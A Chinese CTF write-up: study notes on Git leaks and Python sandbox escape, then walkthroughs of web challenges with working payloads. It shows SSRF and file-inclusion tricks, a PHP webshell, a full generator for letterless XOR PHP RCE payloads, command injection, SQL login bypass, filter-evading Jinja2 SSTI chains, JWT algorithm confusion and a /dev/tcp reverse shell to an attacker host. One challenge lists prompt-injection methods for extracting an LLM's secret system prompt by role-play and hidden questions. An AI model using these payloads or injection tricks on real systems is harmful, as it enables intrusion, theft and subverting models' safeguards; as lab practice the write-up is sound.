## 笔记
### Git泄露
#### Git 对象存储结构
Git 用 SHA-1 作为对象 ID，并采用**二级目录**存储：
```
完整 hash：6ebc6c410875e4ff89651e76f413ba4d84cc8227
存储路径：.git/objects/6e/bc6c410875e4ff89651e76f413ba4d84cc8227
          └── 前2位做目录    └── 后38位做文件名
```
所有对象（commit / tree / blob）都按这个规则存放，且内容经过 **zlib 压缩**。
#### 三种核心对象

| 对象类型       | 作用   | 内容特点                             |     |
| ---------- | ---- | -------------------------------- | --- |
| **commit** | 一次提交 | 纯文本，包含 tree、parent、作者、提交信息       |     |
| **tree**   | 目录快照 | 二进制，记录文件名 + 对应 blob 的 20 字节 SHA1 |     |
| **blob**   | 文件内容 | 真正的源代码或数据                        |     |
#### 利用方法
**直接用git-dumper工具一键下载！！！**
用法：
```bash
git-dumper <目标URL> <本地输出目录>
```
或者闲的没事的时候可以手动进行：
- 访问.git/refs/heads/master（具体看目录扫到了什么）获得最新的commit hash
- 读 commit 对象 → 拿到对应的 **tree hash** 和 **parent hash**
- 读 tree 对象 → 解析出每个文件的 **blob hash**
- 读 blob 对象 → 得到所有文件
- 也通过 parent 继续往前挖历史 commit
### python变量污染
思路：
要想污染全局变量就要想拿到\_\_globals\_\_
要想拿到\_\_globals\_\_就要想拿到一个类的一个方法
因此可以利用已知类的已知方法一路到\_\_globals\_\_再找到想要污染的全局变量

常用拿到\_\_globals\_\_的方式有：
```python
类名.__class__.__init__.__globals__
类名.__init__.__globals__
类名.已知方法.__globals__
```
### python沙盒逃逸之绕过ast
#### 介绍
##### 作用
把源代码解析成语法树，让你可以检查或修改它
##### 常用节点类的介绍

| 名称                   | 解释                 |
| -------------------- | ------------------ |
| ast.Module           | 表示一个整个的模块或者脚本      |
| ast.FunctionDef      | 表示一个函数定义           |
| ast.AsyncFunctionDef | 表示一个异步函数定义         |
| ast.ClassDef         | 表示一个类定义            |
| ast.Return           | 表示一个return语句       |
| ast.Delete           | 表示一个del语句          |
| ast.Assign           | 表示一个赋值语句           |
| ast.AugAssign        | 表示一个增量赋值语句，如x += 1 |
| ast.For              | 表示一个for循环          |
| ast.While            | 表示一个while循环        |
| ast.If               | 表示一个if语句           |
| ast.With             | 表示一个with语句         |
| ast.Raise            | 表示一个raise语句        |
| ast.Try              | 表示一个try/except语句   |
| ast.Import           | 表示一个import语句       |
| ast.ImportFrom       | 表示一个from…import…语句 |
| ast.Expr             | 表示一个表达式            |
| ast.Call             | 表示一个函数调用           |
| ast.Name             | 表示一个变量名            |
| ast.Attribute        | 表示一个属性引用，如x.y      |
| ast.Subscript        | 表示一个下标访问，如x\[y]    |
##### 常用节点类的属性
```txt
Name
├── id  → 'x'        # 字符串
└── ctx → Load()     # Load/Store/Del

Constant
└── value → 1        # 真正的值

Subscript 
├── value  → Name(id='d')          # 被下标对象
└── slice  → Constant(value='k')   # 下标内容
                └── value → 'k'    # 字面量值（字符串）

Attribute
├── value  → Name(id='os')         # 对象
└── attr   → 'system'              # 属性名（直接是字符串！）

Call
├── func    → Attribute(...)       # 被调对象
├── args    → [Constant(1), ...]   # 位置参数节点列表
└── keywords→ [keyword(...)]       # 关键字参数节点列表
```
#### 黑名单绕过
用赋值，\_\_dict\_\_加字符串拼接的方式转成其他的ast节点，从而绕过对应的Visit_Node的遍历访问检测
## 题目
### flag点击就送_吗?
扫了下根目录没找到又用的的东西，同时转了几次转盘发现拿不到flag'，查看源代码发现/appeal-backend/路由
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261026185648015.png)
进入/appeal-backend/查看源代码，发现存在预览接口故推测此处存在SSRF漏洞，并且还告诉我们服务器是通过X-Original-URL判断是否是本地访问
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261026185717583.png)
尝试扫描/preview-api/的目录，没想到扫成功了
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261026191958784.png)
在/preview-api/robots.txt里发现.git，尝试用git-dumper直接下载，成功，获得server.py和config.py
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261026211943126.png)
访问server.py得到的源代码如下
```python
from urllib.parse import urlparse
import requests
import os

app = Flask(__name__)

ALLOWED_HOSTS = {"appeal-backend:8080"}
ALLOWED_FILE_DIRS = ["/app"]
# 实际可达的目标主机硬白名单：白名单子串判断的 @ 绕过是预期考点，
# 但绕过后的有效目标必须仍在内网，防止 SSRF 打到任意外网主机
ALLOWED_TARGET_HOSTS = {"appeal-backend", "complaint-viewer"}
ALLOWED_SCHEMES = {"http", "https"}

# 容器整合部署：complaint-viewer 与申诉后台在同一容器，viewer 实际监听本机 8081
VIEWER_INTERNAL = "http://127.0.0.1:8081"


def is_local_request():
    """运营内网才能调用的接口：校验 X-Original-URL 头。

    注意：单容器部署下 nginx 反代的 remote_addr 恒为 127.0.0.1，
    因此不能用 remote_addr 做回退判断，只认请求头。
    """
    original_url = request.headers.get("X-Original-URL", "")
    return original_url.strip().lower() in ("localhost", "127.0.0.1")


def resolve_url(url):
    """complaint-viewer 的实际服务端口在本地 8081，请求前做内部映射。

    基于 urlparse 精确解析有效目标（scheme + hostname），不采用子串判断，
    防止通过 @ userinfo / query 夹带等方式 SSRF 到任意外网主机；
    302 跳转由 allow_redirects=False 兜底。
    """
    parsed = urlparse(url)
    if parsed.scheme not in ALLOWED_SCHEMES:
        return None
    if parsed.hostname not in ALLOWED_TARGET_HOSTS:
        return None
    if parsed.hostname == "complaint-viewer":
        target = VIEWER_INTERNAL + parsed.path
        if parsed.query:
            target += "?" + parsed.query
        return target
    return url


@app.route("/")
def index():
    return """
    <html><body>
    <h1>砍价申诉后台 v2.3</h1>
    <p>内部系统，仅限运营使用</p>
    <ul><li><a href="/api/appeals">申诉列表</a></li></ul>
    </body></html>
    """


@app.route("/api/appeals")
def appeals():
    return jsonify({"total": 12608, "status": "running"})


@app.route("/robots.txt")
def robots():
    return """User-agent: *
Disallow: /.git/
Disallow: /config.py
"""


@app.route("/config.py")
def config_py():
    with open("/app/config.py", "r", encoding="utf-8") as f:
        content = f.read()
    return content, 200, {"Content-Type": "text/plain; charset=utf-8"}


@app.route("/.git/<path:filename>")
def git_files(filename):
    git_dir = "/app/.git"
    full_path = os.path.normpath(os.path.join(git_dir, filename))
    if not full_path.startswith(git_dir):
        return "forbidden", 403
    if not os.path.isfile(full_path):
        return "not found", 404
    return send_from_directory(git_dir, filename, mimetype="application/octet-stream")


@app.route("/preview")
def preview():
    if not is_local_request():
        return "Access denied: this endpoint is for internal (localhost) use only.", 403

    url = request.args.get("url", "")
    if not url:
        return "missing url", 400

    if url.startswith("file://"):
        path = os.path.normpath(url[7:])
        # 严格前缀校验（normpath 防止 /app/../ 穿越到 /var/www 等目录）
        if not any(path == d or path.startswith(d.rstrip("/") + "/") for d in ALLOWED_FILE_DIRS):
            return f"file {path} not allowed", 403
        if not os.path.isfile(path):
            return f"file {path} not found", 404
        with open(path, "rb") as f:
            content = f.read()
        return content, 200, {"Content-Type": "application/octet-stream"}

    # 白名单校验：用 in 判断字符串包含（有 @ 绕过漏洞）
    if not any(host in url for host in ALLOWED_HOSTS):
        return "host not allowed. The service is under maintenance - for now, local staff can only go through appeal-backend:8080.", 403

    real_url = resolve_url(url)
    if real_url is None:
        # 有效目标不在内网白名单内（防任意 SSRF），对外与白名单失败返回同样提示
        return "host not allowed. The service is under maintenance - for now, local staff can only go through appeal-backend:8080.", 403

    try:
        r = requests.get(real_url, timeout=10, allow_redirects=False)
        if "/.git/" in url:
            return r.content, 200, {"Content-Type": "application/octet-stream"}
        return r.text[:5000]
    except Exception:
        # 错误信息脱敏：不区分 timeout/refused/DNS，消除内网探测 oracle
        return "error: request failed", 500


if __name__ == "__main__":
    app.run(host="127.0.0.1", port=8080)
```
让AI分析了下这段代码，发现等访问的只有 appeal-backend:8080和complaint-viewer（映射到127.0.0.1:8081），可以通过@绕过必须要有appeal-backend:8080的限制（在URL中@前面的内容被认为是用户名和密码，后面的内容才是实际访问的网站）
尝试访问complaint-viewer后发现该主机存在file接口可以进行文件读取
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261026200521548.png)
尝试读取index.php发现报出内存耗尽的错误，猜测这里有文件包含，自己包自己导致无限递归从未内存耗尽
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261026210234231.png)
用php://filter伪协议把读取内容编码输出防止被执行
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261026201902632.png)
解码后得到index.php
```php
<?php
$file = $_GET['file'] ?? 'list.php';
include($file);
?>
```
尝试读取flag.php成功，解码后得到flag
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261026202128290.png)
### 投喂鲸鱼娘
查看源代码发现upload.js
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261027164452703.png)
里面暗示了文件上传拿shell，以及可能是黑名单过滤，但是让ds分析了下这段源码没找到其他特别有用的，用bp爆破了下常见可能绕过的后缀名，发现pht,phtm,phtml没被过滤
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261027152559741.png)
尝试上传一张png图像并修改后缀名为phtml，但是他的幻术头有问题，所以给他全删了换成了GIF的幻术头（GIF89a）成功上传
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261027160213349.png)
尝试上传一句话木马，但是\<?php被WAF拦截了，尝试换成短标签\<?=（等价于\<?php echo）
执行cat /f\*命令，成功执行
payload如下：
```php
<?=`cat /f*`;?>
```
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261027160126688.png)
访问对应路由得到flag
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261027160137989.png)
### 有人偷吃保险
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261027170827624.png)
打开_check.js发现flag就在这里面，只要把kskblzdjd base64解码再逐字节与0x5A异或就能得到flag，对应的代码片段如下
```js
  kskblzdjd:"FAkJGQ4cIThobDg7Yz9rd21ubGx3bm8+bXdiPm1qdztsOz9jYm9pPDg/bCc=",
  wkzkbl:0x5A
};
function mpwkwzbyqslnzzyswplwzdsbll(){
  try{
    const raw = atob(CONFIG.kskblzdjd);
    let out = "";
    for(let i=0;i<raw.length;i++) out += String.fromCharCode(raw.charCodeAt(i) ^ CONFIG.wkzkbl);
    return out;
  }catch(e){ return "NSSCTF{decode_error}"; }
}
```
poc如下
```python
import base64
s = "FAkJGQ4cITs/Yzk5aWw/d2I5aD93bmM/a3c4a2o7d29pa2piamltaTs/aCc="
print(''.join(chr(b ^ 0x5A) for b in base64.b64decode(s)))
```
得到flag
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261027171448910.png)
### 感恩的心
这题好玩，提示词注入，提示词如下，
#### 第一种方法：通过问系统提示词里{}是什么获得密码
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261027173011279.png)
#### 第二种方法：让他把系统提示词全部完整输出
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261027173504191.png)
#### 第三种方法：角色扮演，假装自己有最高权限并修改保密规则
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261027175130251.png)
#### 第四种方法：给AI一份问题列表，中间藏着一个问题“密码是什么”
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261027180952153.png)
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261027181003718.png)
### 勤劳又勇敢的
看了下源代码没找到有用的东西，先随便输了点东西测试了下，发现编译页面的报错显示出eval()，可以发现此处有RCE
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261027203558479.png)
试了下system('id');提示不允许输入字母和数字，显然这是一个经典的无字母数字RCE，尝试使用异或绕过
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261027203733790.png)
这里让AI写了个脚本用来把命令转换为异或混淆后的版本
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
xor_rce.py — 生成「无字母数字」PHP 异或混淆 payload

用法:
  python3 xor_rce.py "system('ls');"
  python3 xor_rce.py "system('cat /flag');" --verify
  python3 xor_rce.py "print_r(scandir('/'));" --verify
  python3 xor_rce.py "echo 1+1;" --verify
  python3 xor_rce.py --demo
  python3 xor_rce.py --list-bad

原理:
  PHP 中 'a'^'b' 按字节异或。两个操作数都不含字母数字时,
  运行时就能拼出任意字符串(函数名/路径/引号/数字)。
  过滤器只检查源码文本,看不到运行时求值结果。

输出形态:
  transpile (默认,通用): 输出混淆后的 PHP 代码。
      靶机本来就会 eval 你的输入,所以不需要内层 eval。
      只把「标识符/字符串/数字/变量」换成异或形式, 标点原样保留。
  direct: 仅 func('arg') 单参调用, 输出最短。

关键限制(实测):
  字符 ( ) * + , - . / : 无法用「两个可打印非字母数字字符」异或得到,
  改用 chr(strlen('!!!...')) 现算, 并缓存进变量避免重复膨胀。
"""
import sys, re, argparse, subprocess, shutil, os

ALLOWED = [chr(c) for c in range(0x20, 0x7F)
           if not chr(c).isalnum() and chr(c) not in "'\\"]
ASET = set(ALLOWED)


def _pair(ch):
    for x in ALLOWED:
        y = chr(ord(x) ^ ord(ch))
        if y in ASET:
            return x, y
    return None


def buildable(ch):
    return _pair(ch) is not None


UNBUILDABLE = "".join(chr(c) for c in range(0x20, 0x7F)
                      if not chr(c).isalnum() and chr(c) not in "'\\"
                      and not buildable(chr(c)))


def xlit(s):
    left, right = [], []
    for ch in s:
        p = _pair(ch)
        if not p:
            raise ValueError(f"字符 {ch!r} (0x{ord(ch):02x}) 无法异或构造")
        left.append(p[0]); right.append(p[1])
    return "('%s'^'%s')" % ("".join(left), "".join(right))


class Assembler:
    """任意字符串 -> 无字母数字表达式; 不可构造字符用 chr(strlen()) 现算并缓存。"""

    def __init__(self):
        self.cache = {}
        self.pre = []
        self._slot = 3

    def _new_var(self):
        name = "$" + "_" * self._slot
        self._slot += 1
        return name

    def char_expr(self, ch):
        if buildable(ch):
            return xlit(ch)
        v = self.cache.get(ch)
        if v:
            return v
        v = self._new_var()
        expr = "%s(%s(%s))" % (xlit("chr"), xlit("strlen"), xlit("!" * ord(ch)))
        self.pre.append("(%s=%s);" % (v, expr))
        self.cache[ch] = v
        return v

    def string_expr(self, s):
        if not s:
            return "''"
        return ".".join(self.char_expr(ch) for ch in s)

    def ident_expr(self, name):
        """函数名/常量名 -> 表达式, 并整体加括号, 保证后面 ( ) 能正确绑定"""
        return "(" + self.string_expr(name) + ")"


# ---------- 预处理: 语言结构无法当函数名, 先改写成函数调用 ----------
# echo/print 是语言结构, 没有函数名可调用 -> 整条语句包成 print_r(...)
STMT_CONSTRUCTS = [
    (r"(?<![\w$])echo\s+([^;]+);", r"print_r(\1);"),
    (r"(?<![\w$])print\s+(?!_)([^;]+);", r"print_r(\1);"),
]

CONSTRUCTS = [
    (r"\band\b", "&&"),
    (r"\bor\b", "||"),
    (r"\bxor\b", "^"),
    (r"\btrue\b", "(!'')"),
    (r"\bfalse\b", "(!!'')"),
    (r"\bnull\b", "(''^'')"),
]


def preprocess(code):
    for pat, rep in STMT_CONSTRUCTS:
        code = re.sub(pat, rep, code)
    for pat, rep in CONSTRUCTS:
        code = re.sub(pat, rep, code)
    return code


TOKEN_RE = re.compile(r"""
    (?P<WS>\s+)
  | (?P<STR>'(?:\\.|[^'\\])*'|"(?:\\.|[^"\\])*")
  | (?P<VAR>\$[A-Za-z_][A-Za-z0-9_]*)
  | (?P<NUM>\d+(?:\.\d+)?)
  | (?P<IDENT>[A-Za-z_\\][A-Za-z0-9_\\]*)
  | (?P<OTHER>.)
""", re.S | re.X)


def unquote(tok):
    q, body = tok[0], tok[1:-1]
    if q == "'":
        return body.replace("\\\\", "\\").replace("\\'", "'")
    esc = {"n": "\n", "t": "\t", "r": "\r", "0": "\0",
           "\\": "\\", "'": "'", '"': '"', "$": "$"}
    out, i = [], 0
    while i < len(body):
        if body[i] == "\\" and i + 1 < len(body):
            out.append(esc.get(body[i + 1], body[i + 1])); i += 2
        else:
            out.append(body[i]); i += 1
    return "".join(out)


def transpile(code, debug=False):
    asm = Assembler()
    code = preprocess(code)
    out, varmap = [], {}

    for m in TOKEN_RE.finditer(code):
        kind, text = m.lastgroup, m.group()
        if kind == "WS":
            out.append(" ")
        elif kind == "STR":
            out.append(asm.string_expr(unquote(text)))
        elif kind == "NUM":
            out.append(asm.string_expr(text))       # 数字本身是字母数字, 用字符串表达式
        elif kind == "VAR":
            if text not in varmap:
                varmap[text] = "$" + "_" * (10 + len(varmap))
            out.append(varmap[text])
        elif kind == "IDENT":
            out.append(asm.ident_expr(text))
        else:
            out.append(text)

    body = re.sub(r"\s+", " ", "".join(out)).strip()
    return "".join(asm.pre) + body


SIMPLE = re.compile(r"""^\s*([A-Za-z_\\][A-Za-z0-9_\\]*)\s*\(\s*(?:'([^']*)'|"([^"]*)")\s*\)\s*;?\s*$""", re.S)


def gen_direct(code):
    m = SIMPLE.match(code)
    if not m:
        return None
    fn = m.group(1)
    arg = m.group(2) if m.group(2) is not None else m.group(3)
    a = Assembler()
    body = "($_=%s)(%s);" % (xlit(fn), a.string_expr(arg))
    return "".join(a.pre) + body


def generate(code, mode="auto"):
    if mode in ("direct", "auto"):
        out = gen_direct(code)
        if out:
            return out, "direct"
        if mode == "direct":
            raise SystemExit("[!] direct 仅支持 func('arg') 单参调用, 请用默认 transpile")
    return transpile(code), "transpile"


def clean(p):
    return re.search(r"[A-Za-z0-9]", p) is None


HARNESS = """<?php
$c = file_get_contents($argv[1]);
if (preg_match('/[a-z0-9]/i', $c)) { fwrite(STDERR, "REJECTED: 含字母数字\\n"); exit(2); }
eval($c);
"""


def verify(payload):
    php = shutil.which("php")
    if not php:
        print("[!] 本机没有 php, 跳过验证"); return
    d = "/tmp/xorrce_verify"; os.makedirs(d, exist_ok=True)
    open(f"{d}/h.php", "w").write(HARNESS)
    open(f"{d}/p.txt", "w").write(payload)
    r = subprocess.run([php, f"{d}/h.php", f"{d}/p.txt"],
                       capture_output=True, text=True, timeout=60)
    print("\n--- 本地 PHP 验证 ---")
    print("exit =", r.returncode)
    if r.stdout: print("stdout:", r.stdout.strip()[:900])
    if r.stderr: print("stderr:", r.stderr.strip()[:600])


DEMOS = [
    "system('id');",
    "system('ls /');",
    "system('cat /flag');",
    "print_r(scandir('/'));",
    "echo 1+1;",
    "$a='id'; system($a);",
]


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("code", nargs="?")
    ap.add_argument("--mode", choices=["auto", "direct", "transpile"], default="auto")
    ap.add_argument("--verify", action="store_true")
    ap.add_argument("--demo", action="store_true")
    ap.add_argument("--list-bad", action="store_true")
    a = ap.parse_args()

    if a.list_bad:
        print("需 chr(strlen()) 兜底的字符:", UNBUILDABLE); return
    if a.demo:
        for c in DEMOS:
            p, how = generate(c, "auto")
            print(f"# {c}   [{how}, {len(p)}B] filter={'PASS' if clean(p) else 'FAIL'}")
            print(p + "\n")
        return
    if not a.code:
        ap.print_help(); return

    p, how = generate(a.code, a.mode)
    print(f"# code : {a.code}")
    print(f"# mode : {how}   len={len(p)}")
    print(f"# filter: {'PASS (无字母数字)' if clean(p) else 'FAIL (仍含字母数字!)'}")
    print()
    print(p)
    if a.verify:
        verify(p)


if __name__ == "__main__":
    main()

```
用该脚本得到使用异或混淆的cat /f\*的命令
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261027205459309.png)
得到flag
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261027205508894.png)
### Northstar
查看源代码，发现app.js
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261028014519310.png)
读js源码发现，验证权限是在通过前端上传AES-CBC加密后的的usr进行的
并且 AES 密钥和 IV硬编码在前端里，因此这里在控制台直接用同样的方式加密admin
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261028014615173.png)
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261027214709550.png)
抓包，并将加密后的admin上传，成功返回200状态码
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261027214756896.png)
尝试目录穿越，发现不管怎么穿都是同样的页面，尝试命令注入，发现成功注入
通过报错可以知道注入的地方在进行cp命令，$()能将括号内的指令返回的内容当成其他命令的参数，这里id的返会结果通过空格分开，而cp命令最后一个空格后的内容被当成目标文件路径，因为不存在这样的路径导致cp失败，所以产生包含该文件路径的报错
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261028011252562.png)
/proc/1/environ   是PID 1 进程（系统/容器的 init 进程）的环境变量原始内容，并且没有空格，cat这个可以看看环境变量里有没有flag，输入payload，发现flag
```bash
$(cat /proc/1/environ | tr '\0' '|' | head -c 300)
```
![](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261028010956019.png)
### php_ctf_challenge
php特性挑战
#### level1
php7/8里数组永远大于非数组，\['1']大于999999999，int把\['1']强制转换为1，而1<100，条件成立
payload：
```
a[]=1
```
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261028015220321.png)
#### level2
md5和弱比较，php在弱比较时，如果字符串看起像科学计数法表示的数时，会取e前面的数值
```php
240610708 0e462097431906509019562988736854 返回：0
314282422 0e990995504821699494520356953734 返回：0
```
payload:
```
b=240610708&c=314282422
```
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261028015445711.png)
#### level3
这里进行的是强比较，\=\=\=两边必须完全一致，没办法用上题的方法，但是这题d进行了2次md5，e进行了一次md5，因此只要e是d一次md5后的值就行
payload：
```
d=240610708&e=0e462097431906509019562988736854
```
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261028020707642.png)
#### level4
change函数里把i传递给了h，而i没有发生变换（函数体内的i是局部变量，u之所以改变是因为用&引用了相同的内存地址），因此只要让h不等于admin，i等于admin就行
payload
```
h=utakata&i=admin
```
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261028020842713.png)
#### level5
...用于解包数组，观察auth发现，只要传入j=NSSCTF并且k为非0值就行
```
j=NSSCTF&k=true
```
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261028021459948.png)
#### level6
strpos(string \$haystack, string \$needle)，会在\$haystack中找第一个\$needle，找到了返回第一个字符的索引，没找到返回false，而flag在flag.php中的开头，strpos会返回0，!0 === true。因此只要传入flag.php就行
payload:
```
l=flag.php
```
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261028021629596.png)
#### level7
这次是强比较了，因此md5后的之一定要一样
这里给出王小云的著名md5碰撞样本，这2个16进制64字节的字符串在md5加密后是完全相等的
```
d131dd02c5e6eec4693d9a0698aff95c2fcab58712467eab4004583eb8fb7f8955ad340609f4b30283e488832571415a085125e8f7cdc99fd91dbdf280373c5bd8823e3156348f5bae6dacd436c919c6dd53e2b487da03fd02396306d248cda0e99f33420f577ee8ce54b67080a80d1ec69821bcb6a8839396f9652b6ff72a70
```
```
d131dd02c5e6eec4693d9a0698aff95c2fcab50712467eab4004583eb8fb7f8955ad340609f4b30283e4888325f1415a085125e8f7cdc99fd91dbd7280373c5bd8823e3156348f5bae6dacd436c919c6dd53e23487da03fd02396306d248cda0e99f33420f577ee8ce54b67080280d1ec69821bcb6a8839396f965ab6ff72a70
```
相关论文：[Microsoft Word - Cryrto04presentation.doc](https://eprint.iacr.org/2004/199.pdf)
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261028024240924.png)
拿到flag
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261028024510003.png)
### 罗德岛作战报告
翻了下源代码，扫了下目录没找到什么有用的，发现/user/id/数字  这里能看干员档案，以为存在SQL注入，但是这里数字是被嵌入到文件地址而不是查询id，尝试改变数字后就会发现因为没有对应的路由而404
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261028191035502.png)
重新回到身份核验这里尝试加了个点号，发现返回MySQL的报错，找到SQL注入点
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261028191115116.png)
用万能钥匙登录了admin账号
payload:
```SQL
username=admin&password=123456'/**/or/**/1=1/**/#
```
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261028191932977.png)
进入admin，输入{{7\*7}}，返回49，发现Jinjia2的SSTI注入漏洞
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261028192411495.png)
这里的过滤非常严格
```
[ config \ . _ lipsum self request cycler joiner namespace dict range
```
这些全部被过滤了，唯一能用的变量只有user，最后靠grok大人给了条payload过了
美观点加注释的展示如下，
```python
{%set und="%c"|format(95)%}  #生成被禁止的字符 _
{%set cls=und~und~"cla"~"ss"~und~und%}  # → "__class__"
{%set bases=und~und~"bases"~und~und%}   # → "__bases__“
{%set sub=und~und~"subcla"~"sses"~und~und%}   # → "__subclasses__"
{%set lm="load"~und~"module"%}          # → "load_module" 
{%set b=user|attr(cls)|attr(bases)%}    
{%set obj=b|first%}   # user.__class__.__bases__[0] 得到 object 类
{%set subs=obj|attr(sub)()%} # object.__subclasses__()
{%for c in subs%} # 在object.__subclasses__()里寻找_frozen_importlib.BuiltinImporter
  {%if "BuiltinImporter" in (c|string)%}
    {%set osmod=c|attr(lm)("os")%}  # 加载os模块
    {{osmod|attr("po"~"pen")("cat /f*")|attr("re"~"ad")()}}  #执行命令
  {%endif%}
{%endfor%}

该payload进行的行为的步骤
1：在user.__class__.__bases__[0].__subclasses__()里遍历找到 BuiltinImporter
2：BuiltinImporter.load_module("os").popen("cat /f*").read()
```
payload如下：
```python
{%set und="%c"|format(95)%}{%set cls=und~und~"cla"~"ss"~und~und%}{%set bases=und~und~"bases"~und~und%}{%set sub=und~und~"subcla"~"sses"~und~und%}{%set lm="load"~und~"module"%}{%set b=user|attr(cls)|attr(bases)%}{%set obj=b|first%}{%set subs=obj|attr(sub)()%}{%for c in subs%}{%if "BuiltinImporter" in (c|string)%}{%set osmod=c|attr(lm)("os")%}{{osmod|attr("po"~"pen")("cat /f*")|attr("re"~"ad")()}}{%endif%}{%endfor%}
```
拿到flag
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261028210117742.png)
### 错位的签名
查看源代码扫目录都没获得有用信息，同时使用bp爆破弱密码登录guest。但是我的密码字典太弱，并且guest的密码是在账号名guest的基础上改的。最终没爆破出来，最后看了wp抄的密码:(

登录后发现三个界面，分别查看
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261031222027019.png)
得到RS256的公钥
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261031223120493.png)
根据hint找到CVE-2026-39999，得知APISIX会根据alg的内容确定签名算法，并且同时还会使用服务器里RS256的公钥
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261031222230271.png)
遂更改alg为HS256，将所有guest都改为admin并用拿到的公钥签名
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261031223057873.png)
进入/flag抓包该jwt拿到flag
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261031223043375.png)
### 渲染如呼吸一样简单
旁边写着jinjia2，试试{{7\*7}}渲染成49，存在jinjia2的SSTI漏洞
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261031224113403.png)
基本没什么过滤，试着通过config一路找到os模块进行shell反弹
```
{{config.__class__.__init__.__globals__['os'].popen("bash -c 'sh -i >& /dev/tcp/攻击者IP/端口 0>&1'").read()}}
```
vps：
```
nc -lvp 端口
```
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261031225634501.png)
成功反弹，但是权限不够读不了flag
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261031225123222.png)
查看环境变量，找到flag
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261031225500432.png)
### 一切的开始
随便访问了下robots.txt发现/inex233
![image.png](https://utakataimg-1420949982.cos.ap-guangzhou.myqcloud.com/pubimg/20261031230341846.png)
进入/inexx233发现是根据谜语修改http的题目，我最讨厌这种题目了，http改来改去的，谜语还有歧义:(
get传参aaa=flag，post传参bbb=flag，Cookie加上sweet=sweet（这我想试了半天sweet=cookie，cookie=sweet...没想到是sweet=sweet乐），Referer改为http://127.0.0.1，Content-Type改为application/json，body里传递{"web": "flag","bbb":"flag"}，最终结果如下：
```http
POST /inex233?aaa=flag HTTP/1.1
Host: 5000-619ff4e9-af14-449e-b4c3-d54563a9466b.challenge.ctfplus.cn
Content-Length: 28
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36 Edg/156.0.0.0
